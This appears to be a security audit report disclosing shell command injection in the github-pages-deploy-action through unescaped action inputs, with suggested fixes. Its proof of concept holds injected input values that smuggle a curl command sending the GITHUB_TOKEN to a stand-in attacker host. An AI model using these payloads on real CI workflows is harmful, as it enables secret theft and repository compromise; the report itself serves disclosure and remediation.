# Security Report — github-pages-deploy-action

| Field | Value |
|-------|-------|
| **Target** | `JamesIves/github-pages-deploy-action` |
| **Commit audited** | `8072b9c7e8f9bd5cda32539dde262854f2073722` (dev branch tip) |
| **Date** | 2026-05-05 |
| **Run type** | initial |
| **Severity** | P3 |
| **Status** | confirmed |

## Summary

Multiple action inputs (`git-config-name`, `git-config-email`, `commit-message`, `branch`, `tag`) are interpolated directly into shell command strings via double-quoted template literals, then passed to `@actions/exec`. An attacker who can control these values (e.g., through a reusable workflow's `inputs` that flow into `with:` parameters, or via a compromised `push` event payload) can inject arbitrary shell meta-characters and achieve command execution on the GitHub Actions runner.

In practice, the most realistic attacker model is a workflow author who passes untrusted data (from PR titles, branch names, commit messages, etc.) into these inputs without sanitization. Because the action itself does not sanitize, it creates a latent injection surface.

## Vulnerability Details

### Attack Surface

The `execute()` function in `src/execute.ts` calls `@actions/exec.exec(cmd, [])` where `cmd` is a single string. The `exec` implementation spawns the command through the shell when a string (rather than an array of args) is provided. User-controlled values are embedded via template literals:

1. **`git-config-name`** → `git config user.name "${action.name}"` (git.ts:43)
2. **`git-config-email`** → `git config user.email "${action.email}"` (git.ts:48)
3. **`commit-message`** → `git commit -m "${commitMessage}" ...` (git.ts:255)
4. **`branch`** → multiple uses in `git ls-remote`, `git push`, `git fetch`, `git diff` (git.ts:135, 270, 294, 219)
5. **`tag`** → `git tag ${action.tag}` and `git push origin ${action.tag}` (git.ts:338, 343)

The surrounding double quotes in the template literal do not prevent injection — characters like `"`, `$()`, and backticks can break out of the quoted context.

### Root Cause

The `execute()` helper passes the full command as a single string to `@actions/exec`. This causes shell interpretation of any meta-characters embedded in the interpolated values. There is no escaping or allow-list validation applied to action inputs before they are embedded into commands.

### Proof of Concept

A workflow that passes an untrusted branch name:

```yaml
name: Deploy
on:
  workflow_dispatch:
    inputs:
      target_branch:
        description: 'Branch to deploy to'
        required: true

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: JamesIves/github-pages-deploy-action@v4
        with:
          folder: build
          branch: ${{ github.event.inputs.target_branch }}
```

If `target_branch` is set to:

```
"; curl http://attacker.example/exfil?t=$(cat $GITHUB_TOKEN) #
```

The resulting shell command becomes:

```
git ls-remote --heads https://x-access-token:***@github.com/owner/repo.git refs/heads/"; curl http://attacker.example/exfil?t=$(cat $GITHUB_TOKEN) #
```

This executes the injected `curl` command and exfiltrates the token.

Similarly for `git-config-name`:

```yaml
with:
  git-config-name: '"; curl http://evil.example/pwn #'
```

Produces:

```
git config user.name ""; curl http://evil.example/pwn #"
```

### Impact

- **Command execution** on the GitHub Actions runner as the runner user.
- **Secret exfiltration** — the `GITHUB_TOKEN` and any secrets passed to the job are accessible in the environment.
- **Repository compromise** — the token typically has `contents: write` permission, allowing arbitrary code push.
- **Supply-chain attack** — if the deployment target is a GitHub Pages site or package registry, the attacker can inject malicious content.

## Affected Code

**src/git.ts — `init()` function (lines 40–48):**

```typescript
await execute(
  `git config user.name "${action.name}"`,
  action.workspace,
  action.silent
)

await execute(
  `git config user.email "${action.email}"`,
  action.workspace,
  action.silent
)
```

**src/git.ts — `deploy()` function (line 255):**

```typescript
await execute(
  `git commit -m "${commitMessage}" --quiet --no-verify`,
  `${action.workspace}/${temporaryDeploymentDirectory}`,
  action.silent
)
```

**src/git.ts — `deploy()` function (lines 135, 270, 309):**

```typescript
`git ls-remote --heads ${action.repositoryPath} refs/heads/${action.branch}`
`git push --force ${action.repositoryPath} ${temporaryDeploymentBranch}:${action.branch}`
`git push --porcelain ${action.repositoryPath} ${temporaryDeploymentBranch}:${action.branch}`
```

**src/git.ts — `deploy()` function (lines 338, 343):**

```typescript
`git tag ${action.tag}`
`git push origin ${action.tag}`
```

## Suggested Fix

1. **Shell-escape all interpolated values.** Use a helper that escapes shell meta-characters (or use `@actions/exec` with the array-of-arguments form instead of a single string):

```typescript
import {exec} from '@actions/exec'

// Instead of: exec(`git config user.name "${name}"`, [])
// Use:        exec('git', ['config', 'user.name', name])
```

2. **Input validation.** Add allow-list regex checks on `branch`, `tag`, `git-config-name`, and `git-config-email` at the `checkParameters()` stage:

```typescript
const SAFE_BRANCH = /^[a-zA-Z0-9._\-/]+$/
if (!SAFE_BRANCH.test(action.branch)) {
  throw new Error(`Invalid branch name: ${action.branch}`)
}
```

3. **Avoid string-form exec entirely.** Refactor `execute()` to accept an argv array and pass it to `exec(program, args)` which avoids shell interpretation altogether.

## Notes

- The severity is P3 (not P1/P2) because exploitation requires the *workflow author* to pass unsanitized external data into the action's `with:` parameters. A workflow that uses static strings (the common case) is not vulnerable. However, this is a dangerous latent footgun — many users construct `branch` or `commit-message` from expressions like `${{ github.head_ref }}` or `${{ github.event.pull_request.title }}` which are attacker-controlled in a `pull_request_target` context.
- The `suppressSensitiveInformation()` utility in `util.ts` already acknowledges the sensitivity of the token — yet the token is embedded verbatim into the repository path string that appears in command lines, meaning it could be exposed via `/proc` or shell error messages even without injection.
- The `@actions/exec` library *does* support the safer `exec(tool, args)` calling convention. Migrating to it would be a straightforward refactor.
- The `rsync` command construction (git.ts:173–199) also interpolates `action.folderPath`, `action.targetFolder`, and `cleanExclude` items without escaping, creating additional injection vectors if these values contain spaces or shell meta-characters.
